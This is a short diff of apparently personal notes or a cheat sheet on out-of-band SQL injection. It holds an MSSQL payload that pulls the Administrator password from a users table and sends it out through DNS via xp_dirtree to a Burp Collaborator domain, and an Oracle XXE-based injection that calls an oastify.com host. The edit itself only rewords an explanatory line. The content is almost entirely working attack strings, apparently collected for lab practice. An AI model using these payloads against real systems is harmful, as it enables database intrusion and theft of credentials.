@@ -11,7 +11,7 @@ tags:
 ```
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
 ```
-- With variable
+- Sets password as variable and sends this request to collaborator
 # Oracle
 ```
 '||(SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')='administrator') THEN (select+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+yvrne+SYSTEM+"http%3a//temp.yfh43prxtlz0sa3tkqg6oaur5ib9zanz'||'.oastify.com/">%25yvrne%3b]>'),'/l')+from+dual) ELSE 'b' END FROM dual)||'
